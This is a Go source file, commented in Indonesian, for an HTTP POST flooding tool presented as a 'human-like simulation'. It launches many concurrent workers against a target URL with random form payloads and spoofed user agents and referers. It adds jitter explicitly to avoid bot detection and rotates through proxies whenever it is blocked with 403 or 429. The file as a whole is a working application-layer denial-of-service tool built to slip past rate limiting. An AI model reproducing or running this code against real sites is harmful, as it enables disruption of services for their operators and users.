package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

var (
	safe              bool
	headersReferers   = []string{
		"https://www.google.com/search?q=",
		"https://www.bing.com/search?q=",
		"https://duckduckgo.com/?q=",
		"https://t.co/",
		"https://www.facebook.com/",
	}
	headersUseragents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	}
	cur      int32
	proxies  []string
	sent     int32
	errCount int32
)

type arrayFlags []string
func (i *arrayFlags) String() string { return "[" + strings.Join(*i, ",") + "]" }
func (i *arrayFlags) Set(value string) error { *i = append(*i, value); return nil }

func main() {
	var (
		site, proxyFile string
		duration, threads, rate int
		headers arrayFlags
	)

	flag.StringVar(&site, "site", "http://localhost", "Target URL")
	flag.StringVar(&proxyFile, "proxy", "", "File proxies.txt")
	flag.IntVar(&duration, "time", 0, "Durasi simulasi (detik)")
	flag.IntVar(&threads, "thread", 100, "Jumlah concurrent worker (human)")
	flag.IntVar(&rate, "rate", 10, "Rata-rata delay per worker (semakin kecil semakin cepat)")
	flag.Var(&headers, "header", "Custom headers")
	flag.BoolVar(&safe, "safe", false, "Stop jika server 500")
	flag.Parse()

	if proxyFile != "" {
		proxies = loadProxies(proxyFile)
	}

	fmt.Printf("[!] Human-Like Simulation: %s\n[!] Workers: %d | Method: POST\n", site, threads)

	go func() {
		for {
			time.Sleep(1 * time.Second)
			s := atomic.SwapInt32(&sent, 0)
			e := atomic.SwapInt32(&errCount, 0)
			fmt.Printf("\rRequests/s: %d | Errors/s: %d | Active Workers: %d", s, e, atomic.LoadInt32(&cur))
		}
	}()

	if duration > 0 {
		time.AfterFunc(time.Duration(duration)*time.Second, func() {
			fmt.Println("\n[!] Simulation finished.")
			os.Exit(0)
		})
	}

	for i := 0; i < threads; i++ {
		go worker(site, headers, rate)
	}

	c := make(chan os.Signal, 1)
	signal.Notify(c, syscall.SIGINT, syscall.SIGTERM)
	<-c
}

func getNewClient(proxyList []string) *http.Client {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	}
	if len(proxyList) > 0 {
		pUrl, _ := url.Parse("http://" + proxyList[rand.Intn(len(proxyList))])
		tr.Proxy = http.ProxyURL(pUrl)
	}
	http2.ConfigureTransport(tr)
	return &http.Client{Transport: tr, Timeout: 10 * time.Second}
}

func worker(site string, headers arrayFlags, rate int) {
	atomic.AddInt32(&cur, 1)
	client := getNewClient(proxies)

	for {
		// Human-like delay: Jitter acak agar tidak terdeteksi bot pattern
		if rate > 0 {
			jitter := rand.Intn(rate * 100)
			time.Sleep(time.Duration(jitter) * time.Millisecond)
		}

		// Payload POST acak (seperti form submission)
		formData := url.Values{}
		formData.Set(buildblock(5), buildblock(10))
		formData.Set("session_id", buildblock(16))
		
		req, _ := http.NewRequest("POST", site, strings.NewReader(formData.Encode()))
		
		// Header Realistis
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(5))
		req.Header.Set("Accept-Language", "en-US,en;q=0.9,id;q=0.8")
		req.Header.Set("Sec-Fetch-Dest", "document")
		req.Header.Set("Sec-Fetch-Mode", "navigate")
		req.Header.Set("Sec-Fetch-Site", "cross-site")
		req.Header.Set("Upgrade-Insecure-Requests", "1")
		req.Header.Set("DNT", "1")

		for _, h := range headers {
			parts := strings.Split(h, ":")
			if len(parts) == 2 {
				req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
			}
		}

		resp, err := client.Do(req)
		if err != nil {
			atomic.AddInt32(&errCount, 1)
			if len(proxies) > 0 { client = getNewClient(proxies) }
			continue
		}

		// Rotasi proxy jika diblokir (403/429)
		if resp.StatusCode == 403 || resp.StatusCode == 429 {
			resp.Body.Close()
			if len(proxies) > 0 { client = getNewClient(proxies) }
			continue
		}

		if safe && resp.StatusCode >= 500 { os.Exit(0) }

		resp.Body.Close()
		atomic.AddInt32(&sent, 1)
	}
}

func loadProxies(path string) []string {
	file, err := os.Open(path)
	if err != nil { return nil }
	defer file.Close()
	var l []string
	sc := bufio.NewScanner(file)
	for sc.Scan() {
		if t := strings.TrimSpace(sc.Text()); t != "" { l = append(l, t) }
	}
	return l
}

func buildblock(size int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, size)
	for i := range b { b[i] = charset[rand.Intn(len(charset))] }
	return string(b)
}